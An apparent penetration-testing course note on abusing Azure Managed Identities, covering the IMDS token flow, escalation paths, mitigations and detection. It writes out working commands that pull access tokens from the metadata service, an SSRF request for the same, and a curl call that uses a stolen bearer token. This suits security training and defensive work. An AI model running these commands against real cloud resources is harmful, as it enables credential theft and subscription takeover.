---
tags: [azure, managed-identity, cloud-security, pentesting, privilege-escalation]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.23 Azure Managed Identity"
---

# 23 - Azure Managed Identity Abuse

## Introduction to Azure Managed Identities

Azure Managed Identities are a feature of Azure Active Directory (Azure AD) that provide Azure services with an automatically managed identity. This identity is used to authenticate to any service that supports Azure AD authentication, including Azure Key Vault, Azure Resource Manager, Azure Storage, and Azure SQL databases.

The primary benefit of Managed Identities is the elimination of credential management for developers. There are no client secrets or certificates to store, rotate, or potentially leak. The Azure platform automatically manages the lifecycle of the identity and its underlying credentials.

While Managed Identities eliminate the risk of hardcoded credentials, they introduce new attack vectors. If an attacker can execute code on a resource that has an attached Managed Identity, they can request an access token from the Azure Instance Metadata Service (IMDS) and assume the identity's permissions.

## Types of Managed Identities

There are two types of Managed Identities:
1. **System-Assigned**: The identity is tied directly to the lifecycle of the Azure resource (e.g., a specific Virtual Machine). When the resource is deleted, the identity is also deleted.
2. **User-Assigned**: The identity is created as a standalone Azure resource. It can be attached to one or more Azure resources. Its lifecycle is independent of the resources it is attached to.

## Architecture and Authentication Flow

The authentication process relies entirely on the local environment of the resource.

```text
+---------------------+        +-------------------------+        +--------------------------+
|  Azure Resource     |        |   IMDS Endpoint         |        |   Azure AD               |
|  (e.g., VM)         |        |   (169.254.169.254)     |        |                          |
|---------------------|        |-------------------------|        |--------------------------|
| 1. App requests     | -----> | 2. VM agent intercepts  | -----> | 3. Agent requests token  |
|    token from IMDS  |        |    request              |        |    from Azure AD         |
|                     |        |                         |        |                          |
| 5. App uses token   | <----- | 4. Token returned to    | <----- | 4. Azure AD validates    |
|    to access API    |        |    application          |        |    and returns token     |
+---------------------+        +-------------------------+        +--------------------------+
```

When an application running on an Azure VM needs to access an Azure service, it sends an HTTP GET request to the local Instance Metadata Service (IMDS) at `169.254.169.254`. The Azure fabric intercepts this request, uses the internal credentials associated with the Managed Identity, obtains a JWT (JSON Web Token) from Azure AD, and returns it to the application.

## Attack Vectors and Exploitation

The core premise of abusing Managed Identities is straightforward: **If you compromise the compute resource, you compromise the identity.**

### 1. Server-Side Request Forgery (SSRF)

SSRF is the most common external attack vector for stealing Managed Identity tokens. If a web application running on an Azure App Service, Function, or VM is vulnerable to SSRF, an attacker can force the application to make a request to the IMDS endpoint.

**Exploitation via SSRF**:
To prevent simple SSRF attacks, Azure requires a specific header: `Metadata: true`. This makes blind or simple GET-based SSRF ineffective unless the attacker can control HTTP headers.

```http
GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ HTTP/1.1
Host: 169.254.169.254
Metadata: true
```

If the attacker successfully injects the header and reaches the IMDS, the server will return a JSON response containing the access token. This token can then be used externally (e.g., from the attacker's local machine) until it expires.

### 2. Remote Code Execution (RCE) / Command Injection

If an attacker achieves RCE on a Virtual Machine, Azure App Service, or Azure Container Instance, extracting the Managed Identity token is trivial.

**On a Windows VM (PowerShell)**:
```powershell
$response = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"}
$response.Content
```

**On a Linux VM (curl)**:
```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true
```

**App Services and Azure Functions**:
For App Services and Functions, the endpoint and headers are often defined in environment variables (`IDENTITY_ENDPOINT` and `IDENTITY_HEADER`).
```bash
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

### 3. Lateral Movement and Privilege Escalation

Once the token is acquired, the attacker must determine what permissions the identity holds. Since the token is a standard JWT, it can be decoded using tools like `jwt.io` to view the claims, though the exact RBAC permissions are not stored in the token itself.

To enumerate permissions, the attacker can use the token with the Azure CLI or REST API.

**Using the stolen token**:
```bash
# Set the token as a variable
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGc..."

# Use the token to list resource groups via REST API
curl -X GET -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions/<SubscriptionID>/resourcegroups?api-version=2021-04-01"
```

If the Managed Identity has broad permissions (e.g., `Contributor` on the subscription), the attacker has effectively achieved a full subscription takeover from a single compromised web app.

### 4. Over-Privileged Managed Identities

Developers often fall into the trap of assigning broad roles (like `Contributor` or `Owner`) to Managed Identities to ensure applications work without granular troubleshooting. This violates the principle of least privilege.

An attacker who compromises a VM with a `Contributor` Managed Identity can:
- Read all Key Vaults.
- Execute commands on other VMs via `RunCommand` or `CustomScriptExtension`.
- Modify Network Security Groups (NSGs).
- Export ARM templates to discover sensitive configurations.

## User-Assigned Managed Identity Abuse

User-assigned identities present a unique lateral movement path. Because they are standalone resources, multiple Azure resources can be associated with the same User-Assigned Identity.

If VM-A and VM-B both use User-Assigned Identity "App-Identity-Prod", and an attacker compromises VM-A, they can request a token for "App-Identity-Prod". They then possess the permissions of that identity, which might include access to resources intended only for VM-B.

Furthermore, if an attacker has the `Managed Identity Operator` role over a User-Assigned Identity, and the `Virtual Machine Contributor` role over a VM, they can attach the highly privileged identity to their VM, restart the VM, and extract the token. This is a classic privilege escalation path.

## Mitigations and Defenses

1. **Strict RBAC Scoping**: Apply the principle of least privilege. A Managed Identity should only have access to the specific resources it needs, and only the required actions (e.g., `Key Vault Secrets User` instead of `Key Vault Administrator`).
2. **Resource-Specific Identities**: Prefer System-Assigned Identities over User-Assigned Identities where possible, to ensure an identity's permissions do not span across multiple, unrelated resources.
3. **Prevent SSRF**: Implement robust input validation, use allowlists for URLs, and deploy Web Application Firewalls (WAF) to detect and block SSRF attempts targeting `169.254.169.254`.
4. **Network Controls**: Restrict outbound access from Azure resources. While the IMDS endpoint is link-local and cannot be blocked via standard Azure NSGs, preventing outbound internet access limits the attacker's ability to exfiltrate data if they do obtain a token.

## Detection and Logging

Detecting Managed Identity abuse relies heavily on anomaly detection, as the authentications are technically legitimate.

- **Monitor Azure AD Sign-in Logs**: Look for `ServicePrincipalSignInLogs`. While you will see many automated logins, look for logins originating from unexpected IP addresses. (Tokens are valid for 24 hours; if an attacker exports the token and uses it from a VPN or external IP, it will log as a sign-in from that IP).
- **Behavioral Analytics**: Alert on identities performing actions outside their normal baseline. E.g., an identity that usually only reads from Storage suddenly attempting to enumerate Role Assignments or list Key Vaults.
- **IMDS Traffic Monitoring**: Use endpoint detection and response (EDR) solutions on the VM to monitor processes making unexpected HTTP requests to `169.254.169.254`.

## Chaining Opportunities

- **SSRF**: Fully realized via `[[27 - Cloud SSRF to Credential Theft — Full Chain]]`.
- **Privilege Escalation**: Once a token is stolen, the attacker can move laterally, linking closely with `[[22 - Azure Service Principal Abuse]]`.
- **IMDS Mastery**: Essential to understand `[[24 - Cloud Metadata Endpoint Cheat Sheet]]` to craft the perfect payload.

## Deep Dive: Advanced Real-World Scenarios and Case Studies

In advanced penetration testing engagements, simplistic vulnerabilities are rarely found in isolation. Instead, attackers must chain multiple low-severity issues to achieve critical impact. The complexity of modern cloud architectures often obscures these attack paths from defenders, while providing numerous opportunities for patient adversaries.

Consider a scenario where an organization implements strict IAM policies but neglects network-level egress controls. An attacker might exploit a minor Server-Side Request Forgery (SSRF) vulnerability that, due to strict IAM, yields a token with seemingly useless permissions. However, by thoroughly enumerating the environment using tools discussed previously, the attacker discovers an obscure, legacy API endpoint internal to the VPC. This endpoint, trusting any request originating from within the network, allows the attacker to manipulate database records.

This illustrates a fundamental principle in cloud security: identity is the new perimeter, but network controls still provide critical defense-in-depth. A failure in either domain can lead to a complete compromise.

Furthermore, the operational tempo of cloud deployments—where Infrastructure as Code (IaC) pipelines deploy changes multiple times a day—frequently introduces transient vulnerabilities. A permission granted temporarily for debugging might be accidentally committed to the main branch, exposing a highly privileged role for just a few hours. Advanced adversaries automate their reconnaissance to detect and exploit these fleeting windows of opportunity.

To combat this, defensive teams must adopt an "assume breach" mentality. This means implementing continuous monitoring of control plane logs (like AWS CloudTrail or Azure Activity Logs), utilizing anomaly detection to spot unusual API call patterns, and conducting regular red team exercises to validate the effectiveness of security controls. The notes in this module provide the offensive perspective necessary to design these robust, resilient cloud architectures.

### The Role of Infrastructure as Code (IaC) in Security Posture

Modern cloud infrastructure is almost entirely defined by code using tools like Terraform, Pulumi, or AWS CloudFormation. While IaC brings immense benefits in terms of reproducibility and scale, it also codifies vulnerabilities if not properly secured. A single misconfiguration in a Terraform module—such as overly permissive security group rules or an exposed storage bucket—can be replicated across dozens of environments instantly.

During penetration tests, gaining access to the IaC repository is often a critical objective. Analyzing the code provides a comprehensive map of the target environment without needing to interact with the cloud provider's APIs, avoiding detection by logging mechanisms like CloudTrail. Furthermore, identifying hardcoded credentials or overly broad IAM roles within the IaC code can highlight direct paths to privilege escalation.

Securing IaC requires integrating security scanning tools directly into the CI/CD pipeline. Solutions like Checkov, tfsec, or OPA (Open Policy Agent) can automatically enforce security policies and block deployments that violate organizational standards. By shifting security left and addressing vulnerabilities at the code level, organizations can prevent misconfigurations from ever reaching production environments.

### Zero Trust Architecture in the Cloud

The concept of Zero Trust is fundamental to modern cloud security. Unlike traditional perimeter-based security models, Zero Trust assumes that the network is always hostile and that internal traffic is no more trustworthy than external traffic. Every request must be authenticated, authorized, and continuously validated, regardless of its origin.

In the context of cloud infrastructure, implementing Zero Trust involves several key practices:
- **Micro-segmentation:** Dividing the cloud environment into small, isolated zones to limit lateral movement in the event of a breach.
- **Identity-Aware Proxy (IAP):** Using a proxy to verify the identity and context of every request before granting access to internal applications.
- **Continuous Monitoring:** Analyzing logs and network traffic in real-time to detect anomalous behavior and respond to threats quickly.
- **Just-in-Time (JIT) Access:** Granting privileges only when they are needed and revoking them immediately after the task is completed, minimizing the window of opportunity for an attacker.

By adopting a Zero Trust mindset, organizations can significantly enhance their resilience against advanced threats and minimize the impact of potential security incidents.

### Summary of the Threat Landscape

The cloud threat landscape is constantly evolving, with attackers continually developing new techniques to bypass security controls. As cloud environments become more complex, the potential attack surface expands, making it increasingly challenging to secure.

Organizations must stay vigilant and continuously adapt their security posture to address emerging threats. This requires a proactive approach, incorporating regular security assessments, penetration testing, and threat modeling. By understanding the tactics, techniques, and procedures (TTPs) used by adversaries, defenders can implement targeted mitigations and improve their overall security posture.

Ultimately, cloud security is a shared responsibility between the cloud provider and the customer. While the provider is responsible for securing the underlying infrastructure, the customer is responsible for securing their applications, data, and configurations. Understanding this shared responsibility model is essential for designing and maintaining a secure cloud environment.

## Related Notes

- `[[22 - Azure Service Principal Abuse]]`
- `[[24 - Cloud Metadata Endpoint Cheat Sheet]]`
- `[[25 - IMDSv2 Bypass Techniques]]`
- `[[27 - Cloud SSRF to Credential Theft — Full Chain]]`
